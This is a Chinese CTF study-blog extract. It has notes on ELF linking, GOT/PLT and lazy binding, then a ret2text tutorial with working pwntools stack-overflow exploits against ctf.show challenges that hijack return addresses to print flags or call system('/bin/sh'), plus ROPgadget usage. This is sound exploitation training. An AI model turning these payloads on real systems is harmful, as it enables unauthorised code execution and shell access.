fun.ELF</span><br></pre></td></tr></table></figure><blockquote><ol><li>-static：告诉编译器在链接时只使用静态库。</li><li>-fno-stack-protector：禁用堆栈保护，这通常用于减少程序大小或提高性能。</li><li>main.c fun.c：指定要编译的源文件。</li><li>-save-temps：保存临时文件（如汇编代码和预处理后的C代码）。</li><li>–verbose：显示详细的编译过程信息。</li><li>-o fun.ELF：输出的可执行文件名为fun.ELF。</li></ol></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> shared;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">fun</span><span class="params">(<span class="type">int</span> *a,<span class="type">int</span> *b)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123; <span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line">  fun(&amp;a,&amp;shared);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//fun.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> shared = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> tmp = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fun</span><span class="params">(<span class="type">int</span> *a,<span class="type">int</span> *b)</span></span><br><span class="line">&#123;  tmp = *a;</span><br><span class="line">   *a = *b;</span><br><span class="line">   *b = tmp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了构造可执行文件指令文件链接器必须完成两个重要工作：符号解析和重定位。</p><ul><li>符号解析是将每个符号（函数、全局变量、静态变量）的引用与其定义进行关联。</li><li>重定位则是将每个符号的定义与一个内存地址进行关联，然后修改这些符号的引用，使其指向这个内存地址。</li></ul><p><img src="/../images/ZN/%E9%93%BE%E6%8E%A5%E5%89%8D%E5%90%8E%E6%AF%94%E8%BE%831.png" alt="1"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -h fun.ELF</span><br></pre></td></tr></table></figure><p><img src="/../images/ZN/%E9%93%BE%E6%8E%A5%E5%89%8D%E5%90%8E%E6%AF%94%E8%BE%832.png" alt="1"></p><p>其中VMA是虚拟地址，LMA是加载地址，一般情况下两者是相同的，可以看到尚未进行链接的目标文件main.o的VMA都是0。而在链接完成后的fun.ELF中，相似节被合并，且完成了虚拟地址的分配。</p><p>对main.o进行反汇编</p><p><img src="/../images/ZN/main%E5%8F%8D%E6%B1%87%E7%BC%96.png" alt="1"></p><p>可以看到main.o函数的地址从0开始。其中，对fun.o函数的调用在偏移0x26处，0xe8是CALL指令的操作码，后四个字节是被调用函数相对于调用指令的下一条指令的偏移量。此时符号还没有重定位，相对偏移为0x00000000,在这个目标文件中，CALL指令下一条MOV指令的地址为0x26,因此CALL指令调用的地址为0x26+(-0)&#x3D;0x26,这只是一个临时地址，编译器其实并不知道位于一个文件中的fu.o函数的实际地址，于是就把地址计算的工作交给链接器；链接器将根据上一步的结果对重定位符号的地址进行修正。</p><p>链接完成后分配具体函数地址可在IDA中查看</p><p>可重定位文件中最重要的就是包含重定位表，用于告诉连接器如何修改节内容。每一个重定位表对应一个需要被重定义的节。</p><h3 id="静态链接库"><a href="#静态链接库" class="headerlink" title="静态链接库"></a>静态链接库</h3><p>后缀名为.a的文件是静态链接库文件，如常见的libc.a。一个静态链接库可以视为一组目标文件经过压缩打包后形成的集合。执行各种编译任务时，需要许多不同的目标文件，比如输入输出有printf.o、scanf.o，内存管理有malloc.o等。为了方便管理，人们使用ar工具将这些目标文件进行了压缩、编号和索引，就形成了libc.a。</p><h2 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h2><h3 id="什么是动态链接"><a href="#什么是动态链接" class="headerlink" title="什么是动态链接"></a>什么是动态链接</h3><p>当大部分可执行文件都需要glibc，那么在静态链接时就要把libc.a和编写的代码链接进去会造成内存占用过多，两个静态链接的可执行文件都包含同意个.o文件，那么在装载如内存时两个相同的库也会装载进去，造成内存空间的浪费。静态链接的另一个明显的缺点是，如果对标准函数做了改动，都需要重新编译整个源文件，使得开发和维护很艰难。</p><p>如果把系统库和自己编写的代码分割成两个独立的模块，等到程序运行时，再把这两个模块进行链接，就可以节省磁盘空间，并且内存中的一个系统库可以被多个程序共同使用，还节省了物理内存空间，<strong>这种在运行或加载时，在内存中完成链接的过程叫做动态链接</strong>，这些用于动态链接的系统库称为共享库，或者共享对象，整个过程由动态连接器完成。</p><p><img src="/../images/ZN/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5.png" alt="动态链接"></p><blockquote><p>GCC默认使用动态链接编译，通过下面的命令将fun.c编译为共享库，然后使用这个库编译main.c。参数-shared表示生成共享库，-fpic表示生成与位置无关的代码。这样可执行文件fun.ELF2就会在加载时与fun.so进行动态链接。ldd 指令在 Linux 操作系统中用于显示可执行文件或库的依赖信息。它列出了指定程序所依赖的所有动态链接库（共享库），以及这些库的具体路径。需要注意的是动态加载器ld-linux.so本身就是一个共享库，因此加载器会加载并运行动态加载器，并由动态加载器来完成其他共享库以及符号的重定位。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fpic -o fun.so fun.c</span><br><span class="line">gcc -fno-stack-protector -o fun.ELF2 main.c ./fun.so</span><br><span class="line">ldd fun.ELF2</span><br><span class="line">objdump -d-M intel --section=.text fun.ELE2 | grep -A 11 &quot;&lt;main&gt;&quot;</span><br></pre></td></tr></table></figure><blockquote><ol><li><strong>objdump</strong>：这是一个常用于查看和分析二进制文件的工具，可以提取、打印出程序中包含的信息。</li><li><strong>-d-M intel</strong>：<ul><li><code>-d</code> 参数表示对指定的文件进行反汇编。</li><li><code>-M intel</code> 参数指定使用Intel语法风格来输出反汇编结果，这种格式更接近人类可读的形式。</li></ul></li><li><strong>–section&#x3D;.text</strong>：这个参数告诉 objdump 只关注并显示 <code>.text</code> 节的内容，即程序的执行代码部分。</li><li><strong>func.ELE2</strong>：这是要被反汇编的目标ELF（Executable and Linkable Format）文件名。</li><li><strong>| grep -A 11 “&lt;main&gt;”</strong><ul><li>使用管道符将 objdump 的输出传递给 grep。</li><li><code>-A 11</code> 参数表示在匹配到“<main>”字符串后继续向下显示11行内容。</li><li>“<main>” 是grep搜索的关键词，这里用来定位 main 函数的位置。</li></ul></li></ol></blockquote><h3 id="位置无关代码"><a href="#位置无关代码" class="headerlink" title="位置无关代码"></a>位置无关代码</h3><p>可以加载而无需重定位的代码称为位置无关代码，它是共享库必须具有的属性，通过GCC传递-fpic参数可以生成PIC。通过PIC，一个共享库的代码可以被无限多个进程所共享，从而节约内存资源。</p><p>由于一个程序的数据段和代码段的相对距离总是保持不变的，因此，指令和变量之间的距离是一个运行时常量，与绝对内存地址无关。于是就有了全局偏移量表(GOT)，它位于数据段的开头，用于保存全局变量和库函数的引用，每个条目占8个字节，在加载时会进行重定位并填入符号的绝对地址。</p><p>实际上,为了引入RELRO保护机制，GOT被拆分为.got节和.got.plt节两个部分，不需要延迟绑定的前者用于保存全局变量引用，加载到内存后被标记为只读；需要延迟绑定的后者则用于保存函数引用，具有读写权限（ret2libc题即利用该表）</p><h3 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h3><p>由于动态链接是由动态链接器在程序加载时进行的，当需要重定位的符号（库函数）多了之后，势必会影响性能。延迟绑定就是为了解决这一问题，其基本思想是当函数第一次被调用时，动态链接器才进行符号查找、重定位等操作，如果未被调用则不进行绑定。</p><p>ELF文件通过过程链接表和GOT的配合来实现延迟绑定，每个被调用的库函数都有一组对应的PLT和GOT。<strong>（plt里存放的是汇编指令，用于跳转到got，got里存放了地址 ）</strong></p><p><strong>位于代码段.plt节的PLT是一个数组</strong>，每个条目占16个字节.其中PLT[0]用于跳转到动态链接器，PLT[1]用于调用系统启动函数__libc_start_main()，我们熟悉的main()函数就是在这里面调用的，从PLT[2]开始就是被调用的各个函数条目。</p><p><strong>位于数据段.got.plt节的GOT也是一个数组</strong>，每个条目占8个字节。其中GOT[0]和GOT[1]包含动态链接器在解析函数地址时所需要的两个地址（.dynamic和relor条目），GOT[2]是动态连接器ld-linux.so的入口点，从GOT[3]开始就是被调用的各个函数条目，这些条目默认指向对应PLT条目的第二条指令，完成绑定后才会被修改为函数的实际地址。</p><blockquote><p><strong>RIP 寄存器</strong>（Instruction Pointer Register）是 x86-64 架构中的一个特殊寄存器，用于存储当前正在执行的指令的下一条指令的地址。在 x86-64 架构中，RIP 寄存器通常被称为“程序计数器”或“指令指针”。</p><h3 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h3><ol><li><strong>指示下一条指令的位置</strong>：<ul><li>RIP 始终指向即将执行的下一条指令的地址。</li><li>这使得 CPU 可以按顺序执行指令流。</li></ul></li><li><strong>支持相对寻址</strong>：<ul><li>在 x86-64 汇编中，RIP 相对寻址是一种常见的内存寻址方式。</li><li>通过使用 <code>[rip + offset]</code> 形式的地址表达式，可以方便地访问与当前指令位置相关的数据。</li></ul></li></ol><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><ul><li>当 CPU 执行完一条指令后，RIP 会自动更新为下一条指令的地址。</li><li>如果遇到跳转、调用或返回等控制转移指令，RIP 会被显式设置为目标地址。</li></ul><p><code>QWORD PTR [rip + 0x200a72]</code> 是 x86-64 汇编语言中的一种内存寻址方式。具体解释如下：</p><ul><li><strong>QWORD</strong>：表示一个 64 位的数据类型（Quad Word）。</li><li><strong>PTR</strong>：指针操作符，用于指定后面的地址表达式所指向的数据类型。</li><li>**[rip + 0x200a72]**：这是一个相对于当前指令指针（RIP）的偏移量。</li></ul></blockquote><p><img src="/../images/ZN/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E8%B0%83%E7%94%A8%E5%BA%93%E5%87%BD%E6%95%B0.png" alt="1"></p><h1 id="汇编基础"><a href="#汇编基础" class="headerlink" title="汇编基础"></a>汇编基础</h1>]]></content>
      
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2text</title>
      <link href="/2024/11/09/ret2text/"/>
      <url>/2024/11/09/ret2text/</url>
      
        <content type="html"><![CDATA[<p>函数压入栈中是由上往下由栈底到栈顶，通过payload将数据压入栈是由下往上由栈顶往上压入到栈底</p><h2 id="未开保护"><a href="#未开保护" class="headerlink" title="未开保护"></a>未开保护</h2><h2 id="存在可利用函数类（地址跳转）"><a href="#存在可利用函数类（地址跳转）" class="headerlink" title="存在可利用函数类（地址跳转）"></a>存在可利用函数类（地址跳转）</h2><h3 id="有打印flag的函数"><a href="#有打印flag的函数" class="headerlink" title="有打印flag的函数"></a>有打印flag的函数</h3><p>什么保护都没开，存在gets函数有栈溢出漏洞，有打印flag的函数。</p><p>思路：利用栈溢出覆盖原函数到其ebp，用flag的地址覆盖原函数返回地址，以达到运行打印flag函数的效果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 pwntools 的上下文环境</span></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到远程服务器</span></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28182</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载本地二进制文件</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 get_flag 函数的地址</span></span><br><span class="line">flag = elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 payload，cyclic用于生成指定数量字符</span></span><br><span class="line">payload = cyclic(<span class="number">0x20</span> + <span class="number">4</span> + <span class="number">4</span>) + p32(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送 payload</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入交互模式</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="信号"><a href="#信号" class="headerlink" title="信号"></a>信号</h2><p>程序栈保护未开，nx开启，发现栈溢出漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> dest[<span class="number">104</span>]; <span class="comment">// [esp+Ch] [ebp-6Ch] BYREF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">strcpy</span>(dest, src);</span><br></pre></td></tr></table></figure><p>发现信号接收函数和flag打印函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">signal(11, (__sighandler_t)sigsegv_handler);</span><br><span class="line">void __noreturn sigsegv_handler()</span><br><span class="line">&#123;</span><br><span class="line">  fprintf(stderr, &quot;%s\n&quot;, flag);</span><br><span class="line">  fflush(stderr);</span><br><span class="line">  exit(1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 C 语言中，<code>signal(11, (__sighandler_t)sigsegv_handler);</code> 这行代码的作用是设置一个信号处理函数来处理 SIGSEGV 信号（即信号编号 11）。SIGSEGV 通常表示程序尝试访问未分配给它的内存地址，或者试图以错误的方式访问有效地址。</p><p>具体来说：</p><ul><li><code>signal</code> 是一个用于注册信号处理函数的系统调用。</li><li>第一个参数 <code>11</code> 表示 SIGSEGV 信号。</li><li>第二个参数 <code>(__sighandler_t)sigsegv_handler</code> 是一个指向信号处理函数的指针，类型被强制转换为 <code>__sighandler_t</code> 类型。</li><li><code>sigsegv_handler</code>这个函数会在发生 SIGSEGV 信号时被调用，并且会接收到信号编号作为参数。</li></ul><p><strong>当发生栈溢出时会发送SIGSEGV信号，接收到信号后会调用sigsegv_handler函数打印出flag</strong>故此题送入105个字符使栈溢出即可获取flag</p><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>有栈溢出漏洞，栈保护未开，程序中有可利用的后门函数获取shell</p><p>找具体覆盖需要多少字节可以关注函数后的注释，32位是[ebp - 12h],64位是[rsp - 12h],也可以看汇编码或gdb输入一串字符查看</p><p><img src="/../images/ret2text/ret2text4.png" alt="1"></p><p>buf &#x3D; byte prt -80即表示buf数组到ebp的距离为80h</p><h3 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h3><p>checksec</p><p><img src="/../images/ret2text/ret2text.png" alt="ret2text"></p><p>发现栈保护运行一下提示已有后门函数拖入ida分析</p><p><img src="/../images/ret2text/ret2text2.png" alt="1"></p><p>发现栈溢出漏洞，read能够读入0x32u的数据而buf只有14的空间，根据注释buf数组到ebp的距离为12h，故可利用该漏洞先覆盖掉buf数组到ebp的空间，因为是32位程序所以再用4个字节覆盖ebp，最后用后门函数的返回地址覆盖原函数返回地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span> <span class="comment">#方便调试（还不会看）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io.process(&#x27;./pwn&#x27;)  # 启动本地进程并与之交互（已注释）</span></span><br><span class="line"></span><br><span class="line">io.remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28187</span>)  <span class="comment"># 连接到远程服务</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;pwn&#x27;</span>)  <span class="comment"># 加载ELF文件</span></span><br><span class="line"></span><br><span class="line">backdoor = elf.sym[<span class="string">&#x27;backdoor&#x27;</span>]  <span class="comment"># 获取后门函数地址</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * (<span class="number">0x12</span> + <span class="number">4</span>) + p32(backdoor)  <span class="comment"># 构造payload</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)  <span class="comment"># 发送payload给目标程序</span></span><br><span class="line"></span><br><span class="line">io.recv()  <span class="comment"># 接收目标程序返回的数据（可选）</span></span><br><span class="line"></span><br><span class="line">io.interactive()  <span class="comment"># 进入交互模式，允许用户与目标程序进行手动交互</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h3><p>64位ubuntu18以上系统调用system函数时是需要栈对齐的。再具体一点就是64位下system函数有个mov aps指令，这个指令要求内存地址必须16字节对齐，只有当地址的末尾是0的时候，才算是与16字节对齐了，如果末尾是8的话，那就是没有对齐。而我们想要在ubuntu18以上的64位程序中执行system函数，必须要在执行system地址末尾是0</p><p>我们需要找一个地址：lea的地址或者retn的地址（函数结束的地址）添加到后门函数的返回地址前</p><p>故直接在调用system函数地址之前去调用一个ret指令。因为本来现在是没有对齐的，那我现在直接执行一条对栈操作指令（ret指令等同于pop rip，该指令使得rsp+8，从而完成rsp16字节对齐），这样system地址所在的栈地址就是0结尾，从而完成了栈对齐。</p><p><img src="/../images/ret2text/ret2text3.png" alt="1"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span>  <span class="comment"># 设置日志级别为debug，以便输出详细的调试信息</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28311</span>)  <span class="comment"># 连接到远程服务，假设目标程序运行在该地址和端口上</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)  <span class="comment"># 加载ELF文件（即目标程序）并获取其符号表信息</span></span><br><span class="line">backdoor = elf.sym[<span class="string">&#x27;backdoor&#x27;</span>]  <span class="comment"># 获取后门函数的地址</span></span><br><span class="line">ret = <span class="number">0x40065B</span>  <span class="comment"># 返回地址，用于保持栈对齐</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0xA</span> + <span class="number">8</span>) + p64(ret) + p64(backdoor)  <span class="comment"># 构造攻击载荷：填充数据以覆盖返回地址，并设置新的返回地址为我们想要调用的函数</span></span><br><span class="line">io.sendline(payload)  <span class="comment"># 发送攻击载荷给目标程序</span></span><br><span class="line">io.recv()  <span class="comment"># 接收来自目标程序的数据（如果有的话）</span></span><br><span class="line">io.interactive()  <span class="comment"># 开启交互模式，允许用户与目标程序进行交互操作</span></span><br></pre></td></tr></table></figure><p>寻找合适的gadgets：在二进制文件中搜索可以利用的指令序列（称为gadgets），这些gadgets可以用来控制程序执行流程。例如，“lea esp, [esp+0x10]”可以将ESP指针向前移动16字节，而“ret”或“retn”指令则用于返回到上一层调用者。</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="32位plus1版"><a href="#32位plus1版" class="headerlink" title="32位plus1版"></a>32位plus1版</h3><p>system与&#x2F;bin&#x2F;sh分离</p><p>checksec 发现canary没开只开了nx</p><p>ida分析有后门函数但是后门函数不完整需要连接，发现可利用栈溢出漏洞如下</p><p><img src="/../images/ret2text/32-1.png" alt="1"></p><p>故构建exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28269)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">x=<span class="number">0x08048750</span> <span class="comment">#/bin/sh的地址</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x12</span>+<span class="number">4</span>)+p32(system)+p32(<span class="number">0</span>)+p32(x)</span><br><span class="line"><span class="comment">#payload=b&#x27;a&#x27;*(0x12+4)+p32(call system)+p32(x)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>payload解读<code>b&#39;a&#39;*（0x12+4）</code>部分用于填充满buf数组且覆盖掉其ebp</p><p><em>（ebp  （基指针寄存器）用于指向当前函数的栈帧基地址。在函数调用过程中，  ebp  通常用于访问函数的局部变量和其他函数参数。每个函数都有自己的栈帧，而  ebp  指向的就是这个栈帧的起始位置。）</em></p><p><code>p32(system)</code>压入system函数地址</p><p><code>p32(0)+p32(x)</code> p32(x)  是  system  的参数，其中  x  是包含  “&#x2F;bin&#x2F;sh”  字符串的内存地址，使用任意四个字节覆盖掉call system后存储的下一条指令的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">call system=</span><br><span class="line">    push next_addr   ;p32(0)就是用来覆盖掉下一条指令的地址，因为已经获得shell了所以下一条指令也不重要了就直接覆盖就好了</span><br><span class="line">    mov rip,system   ;跳转到system函数创建新的栈帧</span><br></pre></td></tr></table></figure><p>32位函数调用时栈上排序为：函数 下一条指令的返回地址 参数</p><p>栈上的动态变化：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">1. 栈初始化：假设我们有一个函数调用，其栈布局如下：</span><br><span class="line">+----------------+ &lt;- 栈顶</span><br><span class="line">|   返回地址     |</span><br><span class="line">|   其他局部变量 |</span><br><span class="line">+----------------+</span><br><span class="line">|   参数1        |</span><br><span class="line">|   参数2        |</span><br><span class="line">+----------------+ &lt;- 栈底</span><br><span class="line">2. 填充字节：首先，我们通过  b&#x27;a&#x27;*(0x12+4)  填充0x12+4个字节到栈上，这些字节将覆盖函数的局部变量和参数，直到达到返回地址的位置：</span><br><span class="line">+----------------+ &lt;- 栈顶</span><br><span class="line">|   返回地址     |</span><br><span class="line">|   aaaaa...     |</span><br><span class="line">+----------------+</span><br><span class="line">|   参数1        |</span><br><span class="line">|   参数2        |</span><br><span class="line">+----------------+ &lt;- 栈底</span><br><span class="line">3. system函数地址：接下来，我们将  system  指令的地址（  p32(system)  ）放入栈中，这个地址将被用作返回地址，当函数返回时，控制流将跳转到  system  函数：</span><br><span class="line">+----------------+ &lt;- 栈顶</span><br><span class="line">|   system 地址   |</span><br><span class="line">|   aaaa...       |</span><br><span class="line">+----------------+</span><br><span class="line">|   参数1        |</span><br><span class="line">|   参数2        |</span><br><span class="line">+----------------+ &lt;- 栈底</span><br><span class="line">4.四个字节覆盖掉调用system函数时压入的下一条指令的返回地址</span><br><span class="line">+----------------+ &lt;- 栈顶</span><br><span class="line">|      aaaa      | </span><br><span class="line">|   system 地址   |</span><br><span class="line">|   aaaa...       |</span><br><span class="line">+----------------+</span><br><span class="line">|   参数1        |</span><br><span class="line">|   参数2        |</span><br><span class="line">+----------------+ &lt;- 栈底</span><br><span class="line">5.压入参数</span><br><span class="line">+----------------+ &lt;- 栈顶</span><br><span class="line">|    /bin/sh      |</span><br><span class="line">|      aaaa      | </span><br><span class="line">|   system 地址   |</span><br><span class="line">|   aaaa...       |</span><br><span class="line">+----------------+</span><br><span class="line">|   参数1        |</span><br><span class="line">|   参数2        |</span><br><span class="line">+----------------+ &lt;- 栈底</span><br></pre></td></tr></table></figure><h3 id="64位plus1版"><a href="#64位plus1版" class="headerlink" title="64位plus1版"></a>64位plus1版</h3><p>还是system与bin&#x2F;sh分离了需要连接</p><p>这题和32位的思路一样，唯一不同的是64位在进行传参时与32位不一样，因为32位是栈传参，而64位是寄存器传参+栈传参，传送的前几个参数一般使用寄存器储存，若参数果果寄存器有限会继续使用栈传参。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">具体64位传参方法如下：</span><br><span class="line">当参数少于7个时，参数从左到右放入寄存器：rdi,rsi,rdx,rcx,r8,r9</span><br><span class="line">当参数为7个以上时，前6个与前面一样，但后面的一次从“右向左”放入栈中，和32位汇编一样</span><br></pre></td></tr></table></figure><p>获取rdi地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn --only &quot;pop|ret&quot; | grep rdi</span><br></pre></td></tr></table></figure><p>参数解释：<br>–binary pwn: 指定了要分析的二进制文件的文件名。<br>–only “pop|ret”: 指定了只查找包含”pop”和”ret”指令序列的代码片段，这些指令通常用于弹出寄存器中的值，并将控制流返回到调用函数的地址处，是ROP攻击中常用的gadgets。<br>| grep rdi: 将ROPgadget的输出传递给grep命令，然后使用grep命令筛选出包含”rdi”寄存器的代码片段，这样就可以只找到包含”pop|ret”指令序列并且弹出rdi寄存器的gadgets。</p><p>gadgets 指的是程序中的一些短小的代码片段，这些代码片段通常以一种特定的指令序列结尾，比如”ret”指令。（就是以 ret 结尾的指令序列）</p><p><img src="/../images/ret2text/pop_rdi.png" alt="1"></p><p>得到rdi的地址：0x4007e3</p><p>接下来获取ret的地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn</span><br></pre></td></tr></table></figure><p><img src="/../images/ret2text/ret.png" alt="1"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td 